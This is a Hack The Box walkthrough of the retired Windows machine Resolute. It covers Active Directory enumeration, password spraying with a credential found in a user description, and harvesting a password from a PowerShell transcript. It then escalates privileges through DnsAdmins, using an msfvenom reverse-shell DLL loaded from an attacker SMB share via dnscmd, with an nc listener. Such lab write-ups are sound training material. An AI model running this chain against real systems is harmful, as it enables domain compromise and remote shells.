---
layout: post
title:  "HTB Resolute Walkthrough"
author: nanobyte
date:   2020-06-02
description: Hack The Box writeup for Resolute, Retired Windows Medium Box
tags: HTB_Walkthrough
---

In this walkthrough, I will take you through the steps of what I performed to root this machine from Hack the Box penetration testing labs. This was a Windows based OS that was rated as a medium difficulty. To begin, I started with my enumeration of the target machine:

{% highlight bash linenos %}
nmap -sV -sC -O -p- 10.10.10.169

Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 08:19 CST
Nmap scan report for resolute.htb (10.10.10.169)
Host is up (0.035s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-12 14:34:56Z)            
135/tcp   open msrpc        Microsoft Windows RPC
139/tcp   open netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)     
464/tcp   open kpasswd5?
593/tcp   open ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open tcpwrapped
3268/tcp  open ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open tcpwrapped
5985/tcp  open http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found                            
9389/tcp  open mc-nmf       .NET Message Framing
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0        
|_http-title: Not Found
49664/tcp open  msrpc     Microsoft Windows RPC
49665/tcp open  msrpc     Microsoft Windows RPC
49666/tcp open  msrpc     Microsoft Windows RPC
49667/tcp open  msrpc     Microsoft Windows RPC
49671/tcp open  msrpc     Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc     Microsoft Windows RPC
49688/tcp open  msrpc     Microsoft Windows RPC
49957/tcp open  msrpc     Microsoft Windows RPC
60579/tcp open  tcpwrapped                                                                                                                                                                              
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).    
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/12%OT=53%CT=1%CU=40312%PV=Y%DS=2%DC=I%G=Y%TM=5DF24E
OS:E8%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=2%ISR=109%CI=I%TS=A)SEQ(SP=101%G
OS:CD=1%ISR=109%CI=I%II=I%TS=A)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8
OS:NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2
OS:000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q
OS:=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=
OS:AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T
OS:=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m40s, deviation: 4h37m09s, median: 7m39s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2019-12-12T06:36:03-08:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-12-12T14:36:02
|_  start_date: 2019-12-12T04:11:37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 622.36 seconds
{% endhighlight %}

I also ran enum4linux, which is a powerful tool that can be used against Windows based machines to enumerate and pull information from the target using SAMBA. SAMBA is a implementation of the server message block (SMB) networking protocol which offers file and print services on a Windows machine. To find this information using enum4linux, I ran it with `-a` option, to perform all simple enumeration against my target:

{% highlight bash linenos %}
enum4linux -a 10.10.10.169

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Dec 29 12:15:48 2019

 ==========================
|    Target Information    |
 ==========================
Target ........... resolute.htb
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

...

 =============================
|    Users on resolute.htb    |
 =============================
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/dom>
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

...

{% endhighlight %}

I did go ahead and limit the output from the machine, since there was a ton of output. However, I left the entire output of users found on the box. When I looked over these results, I did discover that there was a set of credentials, marko:Welcome123!. The exclamation point is a part of the password. Now that I had credentials, I began looking for where I could use them. One of my first go to tools is <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">evil-winrm</a>. This is an evil implementation of the WinRM, or Windows Remote Management. It has a ton of features, and should be ready for use, especially with Hack the Box. I attempted to login to Resulute with these credentials:

{% highlight bash linenos %}
evil-winrm -i 10.10.10.169 -p Welcome123! -u marko
{% endhighlight %}

And it failed! However, many times when new accounts are created, they are setup with a standard default password. So, I began to use this password against all user accounts which were discovered in the enum4linux enumeration, and found that this password did work for an account, melanie:

{% highlight bash linenos %}
evil-winrm -i 10.10.10.169 -p Welcome123! -u melanie
{% endhighlight %}

Awesome! I was now able to log into the machine. Now, I began enumerating the box manually. I found that in the root of C:\, there was a PSTranscripts directory. Enumerating within this directory, I discovered another set of credentials:

{% highlight bash linenos %}
cat C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.
20191203063201.txt

...

PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

...

{% endhighlight %}

Now using these credentials, ryan:Serv3r4Admin4cc123!, I opened a new terminal windows and used Evil-WinRM to log in as Ryan:


{% highlight bash linenos %}
evil-winrm -i 10.10.10.169 -p Serv3r4Admin4cc123! -u ryan
{% endhighlight %}

Again, I began to manually enumerate the machine. I began by looking over what rights I had as this user, and by running a simple `whoami /all` command, I discovered I was a part of a very interesting group:

{% endhighlight %}
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all

...

MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group

...

{% endhighlight %}

I was logged in as a member of DNS Admins! Doing some Google-Fu, I came across this <a href="https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83" target="_blank">Medium</a> article to escelate my privileges. First, on my Kali machine, I used msfvenom to create a malicious DLL to inject onto the machine:

{% highlight bash linenos %}
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.13 LPORT=9001 -f dll > shell.dll
{% endhighlight %}

I then used impacket's smb-server to host the newly created DLL, to run from Resolute. <a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket</a> is another tool that will be used a ton on Hack the Box, and should be on your Kali machine. Impacket is a set of Python classes for working with network protocols, and is a great tool to learn for penetration testing. To spawn this smb-server, from the Impacket examples directory:

{% highlight bash linenos %}
impacket-smbserver test /root/Desktop/HTB/Resolute/
{% endhighlight %}

And now that the DLL is hosted over SMB, before I can run the attack I have to setup my listener on my Kali box:

{% highlight bash linenos %}
nc -nlvp 9001
{% endhighlight %}

I then used dnscmd.exe on Resolute to setup the config to run my malicious DLL, thus returning a privileged shell:

{% highlight bash linenos %}
*Evil-WinRM* PS C:\Windows> dnscmd.exe /config /serverlevelplugindll \\10.10.14.13\\test\\shell.dll
{% endhighlight %}

All I needed to do was call the Resolute machine to stop and start the process:

{% highlight bash linenos %}
*Evil-WinRM* PS C:\Windows> sc.exe stop dns
*Evil-WinRM* PS C:\Windows> sc.exe start dns
{% endhighlight %}

And I got a return on my nc listener:

{% highlight bash linenos %}
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:\users\administrator\desktop
cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop>more root.txt
e1d94876a50685xxxxxxxxxxxxxx
{% endhighlight %}

And with that, I had rooted Resolute! Good luck.
